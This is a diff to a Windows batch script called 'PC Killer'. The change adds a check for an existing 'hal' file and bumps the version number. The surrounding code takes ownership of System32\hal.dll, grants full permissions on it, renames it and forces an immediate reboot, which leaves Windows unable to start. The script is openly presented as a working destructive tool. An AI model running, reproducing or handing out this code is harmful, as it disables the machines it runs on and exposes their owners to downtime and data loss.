@@ -2,7 +2,7 @@
 title PC Killer
 setlocal
 echo Program Name: PC Killer
-echo Version: 1.3.19
+echo Version: 1.3.20
 echo License: GNU General Public License v3.0
 echo Developer: @YonatanReuvenIsraeli
 echo GitHub: https://github.com/YonatanReuvenIsraeli
@@ -47,6 +47,7 @@ echo Invalid syntax!
 goto "Warning"
 
 :"Kill"
+if exist "%windir%\System32\hal" goto "halExist"
 "%windir%\System32\takeown.exe" /f "%windir%\System32\hal.dll" > nul 2>&1
 "%windir%\System32\icacls.exe" "%windir%\System32\hal.dll" /grant "%USERNAME%":(f) > nul 2>&1
 ren "%windir%\System32\hal.dll" "hal" > nul 2>&1
@@ -54,6 +55,12 @@ if not "%errorlevel%"=="0" goto "Error"
 endlocal
 "%windir%\System32\shutdown.exe" /r /t 0
 exit
+
+:"halExist"
+echo.
+echo Please rename to something else or move to another location "%windir%\System32\hal" in order for this batch file to proceed. "%windir%\System32\hal" is not a system file. Press any key to continue when "%windir%\System32\hal" is renamed to something else or moved to another location.
+pause > nul 2>&1
+goto "Kill"
 
 :"Error"
 echo There has been an error! You can try again.
